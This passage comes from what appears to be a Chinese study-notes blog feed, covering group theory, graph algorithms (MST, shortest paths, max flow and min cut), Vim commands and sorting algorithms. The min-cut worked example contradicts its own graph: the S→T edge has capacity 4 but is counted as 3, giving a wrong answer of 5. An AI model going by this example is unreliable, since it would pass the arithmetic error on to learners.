alt="image.png"><br>2.<img src="https://pic.moyuin.top/2025/05/26/683414939463b.png" alt="image.png"><br>3.<img src="https://pic.moyuin.top/2025/05/26/6834149e790c5.png" alt="image.png"><br>定理 3 还有一个推论：<br><img src="https://pic.moyuin.top/2025/05/26/683414bb95ba9.png" alt="image.png"></li></ol><p><strong>拉格朗日定理</strong><br><img src="https://pic.moyuin.top/2025/05/26/68341541976c5.png" alt="image.png"><br>或者说，子群的元素个数是母群的因数。</p><blockquote><p><strong>在一个有限群中，任何一个元素的阶，都必然能整除这个群的阶。</strong></p></blockquote><p>也有一种表达：</p><blockquote><p>对于一个有限群 <code>G</code> 和它的任意一个子群 <code>H</code>，群 <code>G</code> 的阶（元素个数，记作 ∣G∣）必然是子群 <code>H</code> 的阶（∣H∣）的整数倍。</p></blockquote><p>这是对于群 <code>G</code> 为有限群而言，子群 <code>H</code> 的陪集数目是有限的。<br>当群 <code>G</code> 为无限群，陪集数可能有限，可能无限，要依赖选取的子群来确定。拉格朗日定理只适用于有限群。</p><hr><h3 id="置换群">置换群</h3><p>好像就是把洗牌的指令集合为群。<br><img src="https://pic.moyuin.top/2025/05/26/6834188e3730f.png" alt="image.png"></p><p>乘积/复合：<code>σ ∘ τ</code> （或写作 <code>στ</code>），先按 <code>σ</code> 的指令操作，然后按 <code>τ</code> 的指令操作，构成一个新的排列。</p><blockquote><p><strong>注意：</strong> 在数学上，运算顺序通常是<strong>从右往左</strong>的。但是这里 PPT 上这么处理，所以跟着 PPT 的来吧。<br><img src="https://pic.moyuin.top/2025/05/26/683418cec60f2.png" alt="image.png"></p></blockquote><h4 id="定理-4">定理</h4><p><img src="https://pic.moyuin.top/2025/05/26/683418ee50f18.png" alt="image.png"><br>就是把&quot;洗牌顺序&quot;，所有的方法集合，构成了一个置换群。</p><hr><h2 id="环与环域">环与环域</h2><p><img src="https://pic.moyuin.top/2025/05/26/68341a84e329c.png" alt="image.png"><br><img src="https://pic.moyuin.top/2025/05/26/68341a9cf39ed.png" alt="image.png"><br><strong>群 → 环 → 域</strong>，是一个能力不断增强，限制越来越严格的过程。<strong>环是比群多了一个乘法运算的结构，域是比环多了一个除法运算的结构。</strong></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="离散数学" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="离散数学" scheme="https://notes.moyuin.top/tags/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>离散数学&amp;数据结构-图论常匹配问题与算法概括</title>
    <link href="https://notes.moyuin.top/2025/05/12/xue-xi/shu-xue/chi-san-shu-xue-shu-ju-jie-gou-tu-lun-chang-pi-pei-wen-ti-yu-suan-fa-gai-gua/"/>
    <id>https://notes.moyuin.top/2025/05/12/xue-xi/shu-xue/chi-san-shu-xue-shu-ju-jie-gou-tu-lun-chang-pi-pei-wen-ti-yu-suan-fa-gai-gua/</id>
    <published>2025-05-12T06:47:40.000Z</published>
    <updated>2025-05-12T06:47:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>离散数学&amp;数据结构-图论常匹配问题与算法概括</h1><h2 id="基本图论算法">基本图论算法</h2><h3 id="一、最小生成树（Minimum-Spanning-Tree，MST）">一、最小生成树（Minimum Spanning Tree，MST）</h3><ul><li><p><strong>关键词</strong>：连通、造价最小、覆盖所有点、不关注路径、不成环</p></li><li><p><strong>典型题干</strong>：</p><blockquote><p>设计一个通信网络，使所有城市能互相通信且造价最小。</p></blockquote></li><li><p><strong>常用算法</strong>：</p><ul><li><strong>Kruskal</strong>：按边权升序排序，逐条选入，不成环为准。</li><li><strong>Prim</strong>：从任意点出发，逐步扩展最短连边进集合。</li></ul></li><li><p><strong>适用问题类型</strong>：</p><ul><li>网络建设、城市连接、铺设电缆、布线等</li></ul></li></ul><hr><h3 id="二、最短路径（Single-All-Pairs-Shortest-Path）">二、最短路径（Single/All Pairs Shortest Path）</h3><ul><li><strong>关键词</strong>：从某点到某点路径最短、有向/无向图、有权图</li><li><strong>典型题干</strong><blockquote><p>求 A 城市到其他城市的最短路径。</p></blockquote></li><li><strong>常用算法</strong>：<ul><li><strong>Dijkstra</strong>：正权图单源最短路径（常用于地图/网路延迟）</li><li><strong>SPFA</strong>：负边权也能跑，适用于稀疏图</li><li><strong>Floyd</strong>：所有点对最短路径，三重循环（适用于稠密图）</li></ul></li><li><strong>适用问题类型</strong>：<ul><li>地图导航、路线规划、网络延迟最小化</li></ul></li></ul><hr><h3 id="三、旅行商问题（Traveling-Salesman-Problem，TSP）">三、旅行商问题（Traveling Salesman Problem，TSP）</h3><ul><li><strong>关键词</strong>：访问所有点、只访问一次、形成闭环、最短路径</li><li><strong>典型题干</strong>：<blockquote><p>某人需访问所有城市一次并返回起点，求最短路线。</p></blockquote></li><li><strong>常用算法</strong>：<ul><li>暴力搜索 / 状压 DP / 分支限界 / 启发式搜索（如遗传算法）</li></ul></li><li><strong>适用问题类型</strong><ul><li>快递路线、外卖送货、城市巡回问题</li></ul></li></ul><hr><h3 id="四、中国邮路问题（Euler-回路）">四、中国邮路问题（Euler 回路）</h3><ul><li><strong>关键词</strong>：走遍所有<strong>边</strong>一次、不重复、回到起点或不回起点</li><li><strong>典型题干</strong>：<blockquote><p>邮递员需要经过每条街道一次，如何规划路线？</p></blockquote></li><li><strong>常用算法</strong>：<ul><li><strong>Hierholzer 算法</strong>：找欧拉回路或路径</li><li><strong>判断条件</strong>：<ul><li>欧拉回路：所有点度数为偶数</li><li>欧拉路径：最多两个点为奇数度</li></ul></li></ul></li><li><strong>适用问题类型</strong>：<ul><li>邮递、清扫机器人、巡检线路问题</li></ul></li></ul><hr><h3 id="五、拓扑排序问题（DAG-上的排序）">五、拓扑排序问题（DAG 上的排序）</h3><ul><li><strong>关键词</strong>：有向无环图、先修课程、依赖关系、顺序安排</li><li><strong>典型题干</strong>：<blockquote><p>给定课程依赖关系，安排上课顺序。</p></blockquote></li><li><strong>常用算法</strong>：<ul><li><strong>拓扑排序（BFS/Kahn）</strong></li><li><strong>DFS 建序列（逆后序）</strong></li></ul></li></ul><hr><h3 id="一眼看图识题技巧">一眼看图识题技巧</h3><table><thead><tr><th>问题关键词</th><th>属于哪一类</th><th>应用算法</th></tr></thead><tbody><tr><td>连通、造价最小</td><td>最小生成树（MST）</td><td>Prim / Kruskal</td></tr><tr><td>起点到各点最短</td><td>最短路径</td><td>Dijkstra / SPFA</td></tr><tr><td>所有点走一圈</td><td>旅行商问题（TSP）</td><td>状压 DP / 搜索</td></tr><tr><td>所有边走一遍</td><td>中国邮路（Euler 回路）</td><td>Hierholzer</td></tr><tr><td>有依赖顺序安排</td><td>拓扑排序（DAG）</td><td>Kahn / DFS</td></tr></tbody></table><hr><h2 id="图论算法衍生">图论算法衍生</h2><h3 id="网络流">网络流</h3><h4 id="EK算法最大流">EK算法最大流</h4><p>最大流问题就是：</p><blockquote><p>想象你是个调水的管道工：<br>有个<strong>源点（source）</strong>：水从这儿开始流。<br>有个<strong>汇点（sink）</strong>：水最终要流到这。<br>图里的每条边是水管，有个<strong>最大能流多少水的限制（容量）</strong>。<br>你要解决的核心问题就是<br>“从源点最多能往汇点送多少水？”</p></blockquote><ul><li>问题：在给定容量限制下，从源点到汇点的最大可能流量。</li><li>经典算法：Ford-Fulkerson（增广路径）、Edmonds-Karp（BFS）、Dinic（分层图 + DFS）。</li></ul><p>EK算法最大流是：</p><blockquote><p>用<strong>广度优先</strong>去找：从源点到汇点还有没有“能通的水路”。<br>找到就“倒水”：找出这条路上最细的那根管子（瓶颈），推这么多流量。<br>更新管道：把用掉的流量减去，剩下的再来。<br>直到你怎么找都找不到新路了：那就是最大流了。</p></blockquote><p>Edmonds-Karp 是一种 <strong>基于广度优先搜索（BFS）</strong> 的最大流算法，属于 Ford-Fulkerson 方法的实现之一。<br><strong>注意：离散数学考试给予简化版本，不维护反向边。</strong></p><blockquote><p>它的核心思想是：<br>每次用 BFS 在残量网络中找一条从源点 <code>S</code> 到汇点 <code>T</code> 的最短增广路径，然后将该路径上的可增广流量加入到总流中，并更新残量网络。</p></blockquote><h5 id="核心结构">核心结构</h5><ul><li><strong>残量网络</strong>：对于每条边 <code>(u,v)</code>，我们维护：<br>正向边容量 <code>c(u,v)</code><br>当前流量 <code>f(u,v)</code><br>残余容量 <code>r(u,v) = c(u,v) - f(u,v)</code><br>并添加反向边 <code>(v,u)</code>，其残余容量为 <code>f(u,v)</code>，表示可以“退回”流量。</li></ul><p>假设你有如下图的网络：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">S --(10)--> A --(5)--> T \                      /  \----(15)------------/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>你用 BFS 找到 <code>S-&gt;A-&gt;T</code>，可增广流为 <code>5</code>，再找 <code>S-&gt;T</code>，可增广流为 <code>15</code>。<br>总流量 <code>5 + 15 = 20</code>，路径更新后不能再增广，算法结束。</p><h4 id="最小割">最小割</h4><ul><li><p><strong>割</strong>：将所有节点分为两个集合 <code>S集合</code> 和 <code>T集合</code>，使得源点 <code>S</code> 在 <code>S集合</code>，汇点 <code>T</code> 在 <code>T集合</code>。</p></li><li><p>最小割：在所有可能的割中，<strong>跨越两个集合的边的容量之和最小的割</strong>。</p></li><li><p>问题：将图中点集分为两部分，使得源点在一侧，汇点在另一侧，割掉的边容量总和最小。</p></li><li><p>定理：最大流 = 最小割。<br><strong>在一个有向图中，从源点 <code>S</code> 到汇点 <code>T</code> 的最大流的大小，等于从 <code>S</code> 到 <code>T</code> 的最小割的容量。</strong></p></li></ul><blockquote><p>最大流 = 能从水库 <code>S</code> 送到城市 <code>T</code> 的最多水量<br>最小割 = 一刀下去能阻断的最小总水流（把某些管道切掉）<br>换句话说：<br>最大你能送的 = 最少别人能拦的</p></blockquote><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">S --(3)--> A --(2)--> T \                  /  \----(4)--------/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最大流是 5（S→A→T 走 2，S→T 走 3）<br>最小割是割断 <code>S→T</code> 和 <code>A→T</code>（容量是 3+2=5）<br>他们相等，定理成立。</p><hr><table><thead><tr><th>术语</th><th>定义（通俗解释）</th></tr></thead><tbody><tr><td>网络流图</td><td>一个带有容量限制的有向图，每条边表示“能容纳多少流量”。</td></tr><tr><td>源点（S）</td><td>流量的起点，像是“水库”或“工厂”。</td></tr><tr><td>汇点（T）</td><td>流量的终点，像是“城市”或“消费者”。</td></tr><tr><td>流量（Flow）</td><td>实际通过边的流量，不能超过边的容量。</td></tr><tr><td>容量（Capacity）</td><td>边所能承受的最大流量，相当于“管道粗细”。</td></tr><tr><td>残量网络</td><td>当前流量状态下，图中还可以继续“走”的路径与容量。</td></tr><tr><td>增广路</td><td>在残量网络中，从源点到汇点还可以“加流”的路径。</td></tr><tr><td>最大流</td><td>从源点到汇点能“加”上的最大总流量。</td></tr><tr><td>割（Cut）</td><td>把图的点分成两个集合，源点在一边，汇点在另一边。</td></tr><tr><td>割的容量</td><td>从源点集合通向汇点集合的边的容量总和。</td></tr><tr><td>最小割</td><td>所有可能割中，容量最小的一个，表示“最小阻断能力”。</td></tr><tr><td>最大流最小割定理</td><td>最大能通过的流量 = 最小能拦下的割。</td></tr><tr><td>EK算法（Edmonds-Karp）</td><td>使用 BFS 查找增广路，逐步累加流量，直到没有增广路。时间复杂度 O(VE²)。</td></tr><tr><td>Dinic算法</td><td>更快的最大流算法，基于分层图+DFS增广。时间复杂度 O(V²E)（稀疏图较优）。</td></tr></tbody></table>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="离散数学" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数学" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>Vim 学习 Daily</title>
    <link href="https://notes.moyuin.top/2025/05/06/sheng-huo/ji-lu/vim-xue-xi/"/>
    <id>https://notes.moyuin.top/2025/05/06/sheng-huo/ji-lu/vim-xue-xi/</id>
    <published>2025-05-06T13:42:12.000Z</published>
    <updated>2025-05-06T13:42:12.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>Vim 学习</h1><h2 id="学习前哔哔几句">学习前哔哔几句</h2><p>我终于来学习 vim 了！！之前就很想做到写代码扔掉鼠标，特别是鼠标滚轮，把手离开键盘然后又放回去实在是太影响编程体验了…所以开始玩一下vim吧。记录一些小指令避免我忘记。</p><h2 id="DAY-1">DAY 1</h2><p>H J K L 要触发一种联想的话还是挺难的，我目前只能用一种最死记硬背的方式习惯它。<br><img src="https://pic.moyuin.top/2025/05/06/681a1238f0ec0.png" alt="image.png"></p><p>H最左，L最右，J有一个下钩子，K就是最后的向上咯…</p><hr><p>vim 有三种模式，鉴于之前 linux 系统的影响我还是了解一些的。</p><ul><li>输入 : 进入 命令模式<br><code>:wq</code> 直接保存，<code>: 1</code> 据说可以跳转到第一行。</li><li>输入 i 进入输入模式<br>进入输入模式的时候就和普通的输入没啥区别了，但是一些快捷键好像用不了，比如ctrl+A这种全选的，vim有着自己的全选命令。</li><li>输入 v 进入视觉模式<br>有啥用还没摸索出来，到时候看看。<br><img src="https://pic.moyuin.top/2025/05/06/681a12e293631.png" alt="image.png"></li></ul><hr><h2 id="DAY-2">DAY 2</h2><p><code>dd</code> 删除当前行<br><code>gg</code> 去第一行<br><code>u</code> 撤销<br>好不习惯😵‍💫，这些得在<strong>normal</strong>模式下用。</p><hr><h2 id="DAY-3">DAY 3</h2><p><code>p</code> 是直接粘贴<br><code>dG</code> 删除下面所有行，配合 <code>gg</code> 直接去开头做到全选删除<br>nano 的全选我都不会呢…vim 开始有点用处了🥰</p><hr><h2 id="DAY-4">DAY 4</h2><p>然后输入 <code>yG</code> 提示下图 <code>xx lines yanked</code> 成功即可<br><img src="https://pic.moyuin.top/2025/05/09/681e16be2943e.png" alt="image.png"></p><p>但是这样 vim 只是放在了 vim 寄存器里面，对于 vscode 的 vim 插件，需要开启这个功能<br><code>&quot;vim.useSystemClipboard&quot;: true</code><br>才可以复制到系统剪切板里。<br>当然，你也可以用 <code>&quot;+yG</code> 直接加入系统剪切板，不过我嫌它麻烦。<br><img src="https://pic.moyuin.top/2025/05/09/681e16882c4f7.png" alt="image.png"></p><p><em>越来越习惯用 vim 写代码了</em>🥰</p><hr><h2 id="DAY-5">DAY 5</h2><p><code>0</code> 去往该行行首<br><code>$</code> or <code>end</code> 去该行行末</p><p><code>G</code> 向下移动到最后一行<br><code>gg</code> 回到第一行<br><code>nG</code>配合数字，前往第 n 行<br><code>n&lt;space&gt;</code> 去该行的第 n 个字符</p><hr><h2 id="DAY-6">DAY 6</h2><p><code>A</code>直接跳到行尾然后开始编辑<br><code>g_</code> 也是跳到最后一个字符</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="计划" scheme="https://notes.moyuin.top/tags/%E8%AE%A1%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-排序与查找</title>
    <link href="https://notes.moyuin.top/2025/04/22/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-pai-xu-yu-cha-zhao/"/>
    <id>https://notes.moyuin.top/2025/04/22/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-pai-xu-yu-cha-zhao/</id>
    <published>2025-04-22T02:13:27.000Z</published>
    <updated>2025-04-22T02:13:27.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>数据结构-排序</h1><h2 id="排序分类">排序分类</h2><h3 id="稳定性分类">稳定性分类</h3><p>若<strong>序列中关键字值相等的节点经过某种排序方法进行排序之后，仍能保持它们在排序前的相对顺序</strong>，则称这种排序方法是稳定的；否则，称这种排序方法是不稳定的。<br><img src="https://img.moyuin.top/i/2025/04/22/6806fc01136af.png" alt=" "></p><ul><li>稳定排序算法：<ul><li>插入排序</li><li>冒泡排序</li><li>归并排序</li></ul></li><li>不稳定排序算法：<ul><li>选择排序</li><li>希尔排序</li><li>快速排序</li><li>堆排序</li></ul></li></ul><h3 id="内存使用情况分类">内存使用情况分类</h3><ul><li>内部排序：数据存储和位置调整均在内存中进行</li><li>外部排序：大部分数据元素存储在外存，借助内存进行位置调整</li></ul><h3 id="据排序实现手段分类">据排序实现手段分类</h3><ul><li>基于“比较-交换”的排序：通过对关键字的比较，交换关键字在序列中的位置 l 插入排序、冒泡排序、选择排序、快速排序、归并排序、希尔排序、堆排序</li><li>基于“分配”的排序：通过将元素进行分配和收集进行排序 l 桶排序、计数排序和基数排序</li></ul><h3 id="难易程度分类">难易程度分类</h3><ul><li>基本排序：插入排序、冒泡排序、选择排序、……</li><li>高级排序：快速排序、归并排序、堆排序、基数排序、……</li></ul><h2 id="经典排序">经典排序</h2><h3 id="插入排序">插入排序</h3><p><strong>基本思想</strong>：将一个记录插入到已经排好序的序列中，形成一个新的、记录数增1的有序序列 。<br><img src="https://img.moyuin.top/i/2025/04/22/6806fd4235798.png" alt=" "></p><p>我们一般使用直接插入排序。将<code>A[i]</code>插入有序序列，让前面所有的元素比它大/小，从而得到新有序序列。<br><img src="https://img.moyuin.top/i/2025/04/22/6806fde5b07cf.png" alt=" "></p><p>时间复杂度：平均为<code>O(n^2)</code><br>空间复杂度： <code>O(1)</code></p><h4 id="折半插入排序"><strong>折半插入排序</strong></h4><p>二分法进入排序,即为<strong>折半插入排序</strong>,查找位置时间复杂度为<code>O(logn)</code>,但是元素挪动依然为<code>O(n)</code>,所以整体的时间复杂度为<code>O(n^2)</code></p><h4 id="希尔排序">希尔排序</h4><p><strong>基本原理</strong>：先对所有记录按<strong>增量</strong>(d)进行分组，组内进行插入排序；然后减少增量重复上述步骤，直至增量为1 。<br><strong>画线可以连接在一起的视为一个组，比如示例，57，48，66为一个组，进行比较的时候57与48交换，交换后也要考虑57和66是否可以互相交换。</strong><br><img src="https://pic.moyuin.top/2025/05/13/6822ef3d3770b.png" alt="image.png"></p><p><strong>时间复杂度</strong>：依赖于增量序列，没有确切结论，可以优于 O(n2)，例如某些情况下可达到 O(nlog2n) 或 O(n^3/2) 。</p><ul><li>选一个初始 gap，比如 n/2</li><li>按 gap 把数组分成若干组</li><li>对每组做插入排序</li><li>缩小 gap，比如 gap /= 2</li><li>重复直到 gap = 1（就是普通插排）</li></ul><hr><h3 id="简单选择排序">简单选择排序</h3><p><strong>基本思想</strong>：<strong>首先选出最小的项，与第一个项交换；然后在剩余项中选出次小的项，与第二个项交换</strong>；以此类推，直到整个序列有序 。<br><img src="https://pic.moyuin.top/2025/05/13/6822ef207dcbe.png" alt="image.png"></p><ul><li><strong>过程</strong>：每次在未排序序列中找到最小（或最大）元素，存放到排序序列的起始位置 。</li><li><strong>性能</strong>：<ul><li>时间复杂度：O(n^2) (最佳、最坏、平均情况均为 O(n^2) 次比较) 。</li><li>空间复杂度：O(1) 。</li></ul></li></ul><h3 id="堆排序">堆排序</h3><p><strong>基本思想</strong>：将待排序序列构造成一个大顶堆（或小顶堆），此时堆顶元素即为最大（或最小）值。将其与末尾元素交换，然后将剩余n-1个元素重新调整为堆，重复此过程 。<br><img src="https://pic.moyuin.top/2025/05/13/6822ff1c9ca87.png" alt=""><br><img src="https://pic.moyuin.top/2025/05/13/6822ffb93f7c1.png" alt="image.png"><br><img src="https://pic.moyuin.top/2025/05/13/68230027ccde9.png" alt="image.png"></p><p><strong>过程</strong>：包括建堆和调整堆两个主要步骤 。<br>先看建立堆过程吧。<br><img src="https://pic.moyuin.top/2025/05/13/682300a81fde4.png" alt="image.png"><br><img src="https://pic.moyuin.top/2025/05/13/682300c8137b0.png" alt="image.png"><br><img src="https://pic.moyuin.top/2025/05/13/682300d308554.png" alt="image.png"><br><img src="https://pic.moyuin.top/2025/05/13/682300dcca925.png" alt="image.png"></p><p><strong>性能</strong>：</p><ul><li>时间复杂度：O(nlogn) 。</li><li>空间复杂度：O(1) 。</li></ul><h3 id="交换排序">交换排序</h3><p><strong>核心思路</strong>：对序列中的元素进行多次两两交换，从而使序列元素有序 。</p><h4 id="冒泡排序">冒泡排序</h4><p><strong>基本思想</strong>：依次比较相邻两个元素，如果反序则交换，重复操作直到整个序列有序。每趟排序会将当前未排序部分的最大（或最小）元素&quot;冒泡&quot;到最终位置 。<br><img src="https://pic.moyuin.top/2025/05/13/6822f27f1f2f3.png" alt="image.png"></p><p><img src="https://pic.moyuin.top/2025/05/13/6822efdc611e9.png" alt="image.png"></p><p><strong>性能</strong>：</p><ul><li>时间复杂度：O(n2) 。</li><li>空间复杂度：O(1)。</li></ul><h4 id="快速排序">快速排序</h4><p><strong>基本思想</strong>：通过递归分治方法，基于轴点 (pivot) 将待排序序列拆分成两个子序列（<strong>左边元素均小于等于轴点，右边元素均大于等于轴点</strong>），然后对两个子序列分别递归排序 。</p><ul><li><p><strong>选定轴点</strong>：通常是当前子序列最后一个元素（也可以是别的，但这是经典选择）。</p></li><li><p><strong>分区过程</strong>：</p><ul><li>使用左右指针（或一个指针<code>i</code>）遍历序列。</li><li>保证所有小于轴点的元素在左边，大于等于轴点的在右边。</li><li><strong>划定边界</strong>：找出最终轴点应该插入的位置，把它交换过去。</li></ul></li><li><p><strong>递归处理</strong>：</p><ul><li>以轴点为界，继续分别对左子序列和右子序列进行快速排序。</li></ul></li><li><p><strong>终止条件</strong>：</p><ul><li>子序列长度为 0 或 1，说明那一段已经有序，无需继续处理。</li></ul></li></ul><p><img src="https://pic.moyuin.top/2025/05/13/6822f634c5e24.png" alt="image.png"></p><p>快排比较复杂，这里给一个拆分示例，轴点寻找和插入位置寻找不看图不行。（<strong>这里使用的是左右双指针法</strong>）：</p><p>👇 初始数组：</p><pre class="line-numbers language-none"><code class="language-none">[10, 20, 15, 4, 1, 9, 6]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们使用最简单直观的 <strong>Lomuto 分区法</strong>（用最后一个元素当轴点）。每一次递归我们都分区 + 继续快排子数组。</p><hr><p>✅ 第一次快排（全数组）<br><strong>数组</strong>：<code>[10, 20, 15, 4, 1, 9, 6]</code><br><strong>pivot</strong>（轴点）= <code>6</code><br><strong>i = -1</strong></p><p>遍历 j=0 到 j=5：</p><ul><li><code>10 &gt; 6</code> → 跳过</li><li><code>20 &gt; 6</code> → 跳过</li><li><code>15 &gt; 6</code> → 跳过</li><li><code>4 &lt; 6</code> → <code>i=0</code>, 交换 <code>arr[0] ↔ arr[3]</code> → <code>[4, 20, 15, 10, 1, 9, 6]</code></li><li><code>1 &lt; 6</code> → <code>i=1</code>, 交换 <code>arr[1] ↔ arr[4]</code> → <code>[4, 1, 15, 10, 20, 9, 6]</code></li><li><code>9 &gt; 6</code> → 跳过</li></ul><p>结束后，<code>i = 1</code>，交换 <code>arr[2] ↔ pivot (arr[6])</code><br>→ 最终：[4, 1, 6, 10, 20, 9, 15]</p><p>现在 <code>6</code> 已经在正确的位置了！</p><hr><p>🎯 快排左边 <code>[4, 1]</code><br>pivot = <code>1</code><br>i = -1</p><ul><li><code>4 &gt; 1</code> → 跳过<br>结束后 i = -1，交换 <code>arr[0] ↔ arr[1]</code><br>→ <code>[1, 4]</code>，完成了！</li></ul><hr><p>🎯 快排右边 <code>[10, 20, 9, 15]</code><br>pivot = <code>15</code><br>i = 2（<code>6</code> 已经在前面了）<br>从 j=3 开始：</p><ul><li><code>10 &lt; 15</code> → <code>i=3</code>, 交换 <code>arr[3] ↔ arr[3]</code>（自交换）</li><li><code>20 &gt; 15</code> → 跳过</li><li><code>9 &lt; 15</code> → <code>i=4</code>, 交换 <code>arr[4] ↔ arr[5]</code><br>→ <code>[1, 4, 6, 10, 9, 20, 15] 交换 pivot </code>arr[6]<code>和</code>arr[5]<code>→</code>[1, 4, 6, 10, 9, 15, 20]`</li></ul><hr><p>🎯 快排 <code>[10, 9]</code><br>pivot = <code>9</code></p><ul><li><code>10 &gt; 9</code> → 跳过<br>交换 <code>arr[3] ↔ arr[4]</code><br>→ <code>[1, 4, 6, 9, 10, 15, 20]</code></li></ul><hr><p>✅ 最终结果：</p><pre class="line-numbers language-none"><code class="language-none">[1, 4, 6, 9, 10, 15, 20]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p><strong>性能</strong>：</p><ul><li>时间复杂度：平均 O(nlogn)，最坏 O(n2) (当序列已基本有序或轴点选择不佳时) 。</li><li>空间复杂度 (递归栈深度)：平均 O(logn)，最坏 O(n) 。</li></ul><h3 id="归并排序">归并排序</h3><ul><li><p><strong>核心思路</strong>：基于分治思想，将两个或两个以上的有序序列合并为一个新的有序序列 。</p></li><li><p><strong>归并次序</strong> ：</p><ul><li><p><strong>自顶向下</strong>：将序列递归拆分到单个元素，然后两两合并。<br><img src="https://pic.moyuin.top/2025/05/13/6822f2ae78335.png" alt="image.png"></p></li><li><p><strong>自底向上</strong>：将序列看作n个长度为1的有序子序列，然后两两合并，直到合并为一个序列。<br><img src="https://pic.moyuin.top/2025/05/13/6822f2c9130de.png" alt="image.png"></p></li></ul></li><li><p><strong>二路归并 (Two-Way Merge)</strong>：将两个有序序列合并为一个新的有序序列，时间复杂度为 O(m+n)，其中m和n为两个序列的长度 。</p></li><li><p><strong>性能</strong>：</p><ul><li>时间复杂度：O(nlogn) (自顶向下和自底向上均为) 。</li><li>空间复杂度：O(n) (需要额外的辅助空间) 。</li></ul></li><li><p><strong>应用</strong>：求逆序对数量 。</p></li></ul><h3 id="分配排序">分配排序</h3><p>不基于“比较-移动”的排序方式。</p><h4 id="计数排序">计数排序</h4><ul><li><ul><li><strong>假设</strong>：输入元素是 0 到 k 之间的一个整数 。<ul><li><strong>基本思想</strong>：统计每个元素出现的次数，然后根据计数确定每个元素在输出数组中的位置 。</li><li><strong>性能</strong>：<ul><li>时间复杂度：O(n+k)，当 k 为 O(n) 时，复杂度为 O(n) 。</li><li>空间复杂度：O(n+k) 。</li></ul></li></ul></li></ul></li></ul><h4 id="桶排序">桶排序</h4><ul><li><ul><li><strong>基本思想</strong>：将元素分配到有限数量的桶中，然后对每个桶内的元素进行排序（通常用插入排序），最后依次连接各桶中的元素得到有序序列 。<ul><li><strong>与计数排序关系</strong>：计数排序可以看作是桶排序的一种特殊情况，其中每个桶只包含相同值的元素 。</li><li><strong>性能</strong>：<ul><li>时间复杂度：平均 O(n+kn2​+k) (假设均匀分配到k个桶)，如果元素能均匀分配，可以达到 O(n) 。最坏 O(n2) 。</li><li>空间复杂度：O(n+k) 。</li></ul></li></ul></li></ul></li></ul><h4 id="基数排序">基数排序</h4><ul><li><p><strong>核心思路</strong>：将待排序元素看作基于基数（如十进制的10）的元组表示，然后从最低位（LSD）或最高位（MSD）开始，对每一位进行排序（通常使用计数排序作为子排序算法） 。  <br><img src="https://pic.moyuin.top/2025/05/13/68230a0966517.png" alt="image.png"></p></li><li><p><strong>分类</strong>：</p><ul><li><strong>最低位优先 (LSD) 基数排序</strong> ：从最低位到最高位，逐位进行稳定排序。</li><li><strong>最高位优先 (MSD) 基数排序</strong> ：从最高位开始，递归地对子序列进行排序。</li></ul></li><li><p><strong>性能</strong> 